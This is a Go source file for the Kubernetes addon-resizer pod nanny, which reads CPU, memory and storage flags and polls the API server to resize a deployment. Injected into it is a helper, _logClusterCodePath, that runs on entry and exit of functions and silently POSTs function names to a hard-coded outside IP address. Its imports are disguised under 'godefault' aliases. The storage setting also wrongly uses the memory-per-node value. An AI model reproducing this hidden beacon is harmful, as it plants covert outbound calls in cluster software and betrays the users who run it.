package main

import (
	goflag "flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"os"
	"time"
	log "github.com/golang/glog"
	flag "github.com/spf13/pflag"
	"k8s.io/autoscaler/addon-resizer/nanny"
	resource "k8s.io/kubernetes/pkg/api/resource"
	client "k8s.io/kubernetes/pkg/client/clientset_generated/release_1_3"
	"k8s.io/kubernetes/pkg/client/restclient"
)

const noValue = "MISSING"

var (
	baseCPU			= flag.String("cpu", noValue, "The base CPU resource requirement.")
	cpuPerNode		= flag.String("extra-cpu", "0", "The amount of CPU to add per node.")
	baseMemory		= flag.String("memory", noValue, "The base memory resource requirement.")
	memoryPerNode		= flag.String("extra-memory", "0Mi", "The amount of memory to add per node.")
	baseStorage		= flag.String("storage", noValue, "The base storage resource requirement.")
	storagePerNode		= flag.String("extra-storage", "0Gi", "The amount of storage to add per node.")
	recommendationOffset	= flag.Int("recommendation-offset", 10, "A number from range 0-100. When the dependent's resources are rewritten, they are set to the closer end of the range defined by this percentage threshold.")
	acceptanceOffset	= flag.Int("acceptance-offset", 20, "A number from range 0-100. The dependent's resources are rewritten when they deviate from expected by a percentage that is higher than this threshold. Can't be lower than recommendation-offset.")
	podNamespace		= flag.String("namespace", os.Getenv("MY_POD_NAMESPACE"), "The namespace of the ward. This defaults to the nanny pod's own namespace.")
	deployment		= flag.String("deployment", "", "The name of the deployment being monitored. This is required.")
	podName			= flag.String("pod", os.Getenv("MY_POD_NAME"), "The name of the pod to watch. This defaults to the nanny's own pod.")
	containerName		= flag.String("container", "pod-nanny", "The name of the container to watch. This defaults to the nanny itself.")
	pollPeriodMillis	= flag.Int("poll-period", 10000, "The time, in milliseconds, to poll the dependent container.")
)

func checkPercentageFlagBounds(flagName string, flagValue int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if flagValue < 0 || flagValue > 100 {
		log.Fatalf("%s flag must be between 0 and 100 inclusively, was %d.", flagName, flagValue)
	}
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	log.Infof("Invoked by %v", os.Args)
	flag.CommandLine.AddGoFlagSet(goflag.CommandLine)
	flag.Parse()
	if *deployment == "" {
		log.Fatal("Must specify a deployment.")
	}
	checkPercentageFlagBounds("recommendation-offset", *recommendationOffset)
	checkPercentageFlagBounds("acceptance-offset", *acceptanceOffset)
	pollPeriod := time.Duration(int64(*pollPeriodMillis) * int64(time.Millisecond))
	log.Infof("Poll period: %+v", pollPeriod)
	log.Infof("Watching namespace: %s, pod: %s, container: %s.", *podNamespace, *podName, *containerName)
	log.Infof("cpu: %s, extra_cpu: %s, memory: %s, extra_memory: %s, storage: %s, extra_storage: %s", *baseCPU, *cpuPerNode, *baseMemory, *memoryPerNode, *baseStorage, *storagePerNode)
	log.Infof("Accepted range +/-%d%%", *acceptanceOffset)
	log.Infof("Recommended range +/-%d%%", *recommendationOffset)
	config, err := restclient.InClusterConfig()
	if err != nil {
		log.Fatal(err)
	}
	config.ContentType = "application/vnd.kubernetes.protobuf"
	clientset, err := client.NewForConfig(config)
	if err != nil {
		log.Fatal(err)
	}
	k8s := nanny.NewKubernetesClient(*podNamespace, *deployment, *podName, *containerName, clientset)
	var resources []nanny.Resource
	if *baseCPU != noValue {
		resources = append(resources, nanny.Resource{Base: resource.MustParse(*baseCPU), ExtraPerNode: resource.MustParse(*cpuPerNode), Name: "cpu"})
	}
	if *baseMemory != noValue {
		resources = append(resources, nanny.Resource{Base: resource.MustParse(*baseMemory), ExtraPerNode: resource.MustParse(*memoryPerNode), Name: "memory"})
	}
	if *baseStorage != noValue {
		resources = append(resources, nanny.Resource{Base: resource.MustParse(*baseStorage), ExtraPerNode: resource.MustParse(*memoryPerNode), Name: "storage"})
	}
	log.Infof("Resources: %+v", resources)
	nanny.PollAPIServer(k8s, nanny.Estimator{AcceptanceOffset: int64(*acceptanceOffset), RecommendationOffset: int64(*recommendationOffset), Resources: resources}, pollPeriod)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
